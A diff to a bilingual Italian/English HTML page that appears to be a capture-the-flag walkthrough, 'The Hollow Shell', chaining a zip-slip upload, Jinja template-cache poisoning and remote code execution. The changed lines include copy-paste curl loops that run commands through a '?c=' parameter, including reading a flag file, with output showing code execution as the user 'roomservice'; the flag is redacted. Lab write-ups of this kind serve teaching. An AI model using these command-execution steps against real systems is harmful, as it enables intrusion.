@@ -180,7 +180,7 @@
       <span class="meme-tag" data-it="// ../../ con affetto" data-en="// ../../ with love">// ../../ con affetto</span>
     </div>
     <h1 data-it="The Hollow Shell: zip-slip nell'upload, poi SSTI, poi shell" data-en="The Hollow Shell: upload zip-slip, then SSTI, then shell">The Hollow Shell: zip-slip nell'upload, poi SSTI, poi shell</h1>
-    <p class="article-intro" data-it="Un portale invita a caricare una «shell» — un pacchetto .zip di ambiance balneare per i tablet delle camere. La room ti sussurra di cercare degli «automation hook»: non farlo, sono un depistaggio. La vera catena è un estrattore di zip che si fida dei nomi dei file, un allowlist che guarda dalla parte sbagliata, e un dettaglio della cache dei template di Jinja che trasforma una scrittura arbitraria in RCE. Qui sotto ogni comando è pronto da incollare, sostituendo &lt;code&gt;&amp;lt;target&amp;gt;&lt;/code&gt; col tuo IP." data-en="A portal invites you to upload a &quot;shell&quot; — a .zip pack of seaside ambiance for the room tablets. The room whispers at you to hunt for &quot;automation hooks&quot;: don't, they're a red herring. The real chain is a zip extractor that trusts filenames, an allowlist looking the wrong way, and a Jinja template-cache detail that turns an arbitrary write into RCE. Every command below is copy-paste ready — swap &lt;code&gt;&amp;lt;target&amp;gt;&lt;/code&gt; for your IP.">Un portale invita a caricare una «shell» — un pacchetto .zip di ambiance balneare per i tablet delle camere. La room ti sussurra di cercare degli «automation hook»: non farlo, sono un depistaggio. La vera catena è un estrattore di zip che si fida dei nomi dei file, un allowlist che guarda dalla parte sbagliata, e un dettaglio della cache dei template di Jinja che trasforma una scrittura arbitraria in RCE. Qui sotto ogni comando è pronto da incollare, sostituendo <code>&lt;target&gt;</code> col tuo IP.</p>
+    <p class="article-intro" data-it="Un portale invita a caricare una «shell» — un pacchetto .zip di ambiance balneare per i tablet delle camere. La room ti sussurra di cercare degli «automation hook»: non farlo, sono un depistaggio. La vera catena è un estrattore di zip che si fida dei nomi dei file, un allowlist che guarda dalla parte sbagliata, e un dettaglio della cache dei template di Jinja che trasforma una scrittura arbitraria in RCE. Qui sotto ogni comando è pronto da incollare, sostituendo &lt;code&gt;&amp;lt;target&amp;gt;&lt;/code&gt; con l&#x27;IP della macchina target." data-en="A portal invites you to upload a &quot;shell&quot; — a .zip pack of seaside ambiance for the room tablets. The room whispers at you to hunt for &quot;automation hooks&quot;: don't, they're a red herring. The real chain is a zip extractor that trusts filenames, an allowlist looking the wrong way, and a Jinja template-cache detail that turns an arbitrary write into RCE. Every command below is copy-paste ready — swap &lt;code&gt;&amp;lt;target&amp;gt;&lt;/code&gt; for the target box IP.">Un portale invita a caricare una «shell» — un pacchetto .zip di ambiance balneare per i tablet delle camere. La room ti sussurra di cercare degli «automation hook»: non farlo, sono un depistaggio. La vera catena è un estrattore di zip che si fida dei nomi dei file, un allowlist che guarda dalla parte sbagliata, e un dettaglio della cache dei template di Jinja che trasforma una scrittura arbitraria in RCE. Qui sotto ogni comando è pronto da incollare, sostituendo <code>&lt;target&gt;</code> con l'IP della macchina target.</p>
   </div>
   <div class="article-body">
 
@@ -191,7 +191,7 @@
 
     <div class="callout">
       <div class="callout-label" data-it="// prima di iniziare" data-en="// before you start">// prima di iniziare</div>
-      <p data-it="Sostituisci &lt;code&gt;&amp;lt;target&amp;gt;&lt;/code&gt; con l&#x27;IP della macchina: l&#x27;app risponde sulla porta &lt;strong&gt;5000&lt;/strong&gt;. I comandi girano sulla &lt;strong&gt;tua&lt;/strong&gt; macchina salvo dove indicato «sul target». Servono: &lt;code&gt;nmap&lt;/code&gt;, &lt;code&gt;curl&lt;/code&gt;, &lt;code&gt;python3&lt;/code&gt;." data-en="Swap &lt;code&gt;&amp;lt;target&amp;gt;&lt;/code&gt; for the box IP: the app answers on port &lt;strong&gt;5000&lt;/strong&gt;. Commands run on &lt;strong&gt;your&lt;/strong&gt; machine unless the step says «on the target». You need: &lt;code&gt;nmap&lt;/code&gt;, &lt;code&gt;curl&lt;/code&gt;, &lt;code&gt;python3&lt;/code&gt;.">Sostituisci <code>&lt;target&gt;</code> con l'IP della macchina: l'app risponde sulla porta <strong>5000</strong>. I comandi girano sulla <strong>tua</strong> macchina salvo dove indicato «sul target». Servono: <code>nmap</code>, <code>curl</code>, <code>python3</code>.</p>
+      <p data-it="Sostituisci &lt;code&gt;&amp;lt;target&amp;gt;&lt;/code&gt; con l&#x27;IP della macchina e &lt;code&gt;&amp;lt;PASSWORD&amp;gt;&lt;/code&gt; con la password letta al passo [02]: l&#x27;app risponde sulla porta &lt;strong&gt;5000&lt;/strong&gt;. I comandi girano sulla &lt;strong&gt;tua&lt;/strong&gt; macchina salvo dove indicato «sul target». Servono: &lt;code&gt;nmap&lt;/code&gt;, &lt;code&gt;curl&lt;/code&gt;, &lt;code&gt;python3&lt;/code&gt;." data-en="Swap &lt;code&gt;&amp;lt;target&amp;gt;&lt;/code&gt; for the box IP and &lt;code&gt;&amp;lt;PASSWORD&amp;gt;&lt;/code&gt; for the password you read in step [02]: the app answers on port &lt;strong&gt;5000&lt;/strong&gt;. Commands run on &lt;strong&gt;your&lt;/strong&gt; machine unless the step says «on the target». You need: &lt;code&gt;nmap&lt;/code&gt;, &lt;code&gt;curl&lt;/code&gt;, &lt;code&gt;python3&lt;/code&gt;.">Sostituisci <code>&lt;target&gt;</code> con l'IP della macchina e <code>&lt;PASSWORD&gt;</code> con la password letta al passo [02]: l'app risponde sulla porta <strong>5000</strong>. I comandi girano sulla <strong>tua</strong> macchina salvo dove indicato «sul target». Servono: <code>nmap</code>, <code>curl</code>, <code>python3</code>.</p>
     </div>
 
     <h2 data-it="[01] Ricognizione" data-en="[01] Recon" id='recon'>[01] Ricognizione</h2>
@@ -354,7 +354,7 @@
 <pre><span class="comment"># martella /dashboard finché risponde il worker avvelenato (marker ZQ7X)</span>
 <span class="neutral">for i in $(seq 1 80); do</span>
 <span class="neutral">  out=$(curl -s -b cookie.txt "http://&lt;target&gt;:5000/dashboard?c=id")</span>
-<span class="neutral">  echo "$out" | grep -q ZQ7X &amp;&amp; { echo "$out" | grep -oP '(?&lt;=&lt;pre&gt;).*?(?=&lt;/pre&gt;)'; break; }</span>
+<span class="neutral">  echo "$out" | grep -q ZQ7X &amp;&amp; { echo "$out" | tr -d '\n' | grep -oP '(?&lt;=&lt;pre&gt;).*?(?=&lt;/pre&gt;)'; break; }</span>
 <span class="neutral">done</span>
 <span class="ok">uid=996(roomservice) gid=996(roomservice)</span>   # RCE come roomservice</pre>
 </div></div>
@@ -362,7 +362,7 @@
 <pre><span class="comment"># hammer /dashboard until the poisoned worker answers (marker ZQ7X)</span>
 <span class="neutral">for i in $(seq 1 80); do</span>
 <span class="neutral">  out=$(curl -s -b cookie.txt "http://&lt;target&gt;:5000/dashboard?c=id")</span>
-<span class="neutral">  echo "$out" | grep -q ZQ7X &amp;&amp; { echo "$out" | grep -oP '(?&lt;=&lt;pre&gt;).*?(?=&lt;/pre&gt;)'; break; }</span>
+<span class="neutral">  echo "$out" | grep -q ZQ7X &amp;&amp; { echo "$out" | tr -d '\n' | grep -oP '(?&lt;=&lt;pre&gt;).*?(?=&lt;/pre&gt;)'; break; }</span>
 <span class="neutral">done</span>
 <span class="ok">uid=996(roomservice) gid=996(roomservice)</span>   # RCE as roomservice</pre>
 </div></div>
@@ -373,7 +373,7 @@
 <pre><span class="comment"># stesso loop di [05], stavolta il comando legge la flag:</span>
 <span class="neutral">for i in $(seq 1 80); do</span>
 <span class="neutral">  out=$(curl -s -b cookie.txt "http://&lt;target&gt;:5000/dashboard?c=cat%20/home/roomservice/flag.txt")</span>
-<span class="neutral">  echo "$out" | grep -q ZQ7X &amp;&amp; { echo "$out" | grep -oP '(?&lt;=&lt;pre&gt;).*?(?=&lt;/pre&gt;)'; break; }</span>
+<span class="neutral">  echo "$out" | grep -q ZQ7X &amp;&amp; { echo "$out" | tr -d '\n' | grep -oP '(?&lt;=&lt;pre&gt;).*?(?=&lt;/pre&gt;)'; break; }</span>
 <span class="neutral">done</span>
 THM{<span class="redaction">████████████████████</span>}   # in chiaro solo sul TUO target (qui: policy)</pre>
 </div></div>
@@ -381,7 +381,7 @@ THM{<span class="redaction">█████████████████�
 <pre><span class="comment"># same loop as [05], this time the command reads the flag:</span>
 <span class="neutral">for i in $(seq 1 80); do</span>
 <span class="neutral">  out=$(curl -s -b cookie.txt "http://&lt;target&gt;:5000/dashboard?c=cat%20/home/roomservice/flag.txt")</span>
-<span class="neutral">  echo "$out" | grep -q ZQ7X &amp;&amp; { echo "$out" | grep -oP '(?&lt;=&lt;pre&gt;).*?(?=&lt;/pre&gt;)'; break; }</span>
+<span class="neutral">  echo "$out" | grep -q ZQ7X &amp;&amp; { echo "$out" | tr -d '\n' | grep -oP '(?&lt;=&lt;pre&gt;).*?(?=&lt;/pre&gt;)'; break; }</span>
 <span class="neutral">done</span>
 THM{<span class="redaction">████████████████████</span>}   # cleartext only on YOUR target (here: policy)</pre>
 </div></div>
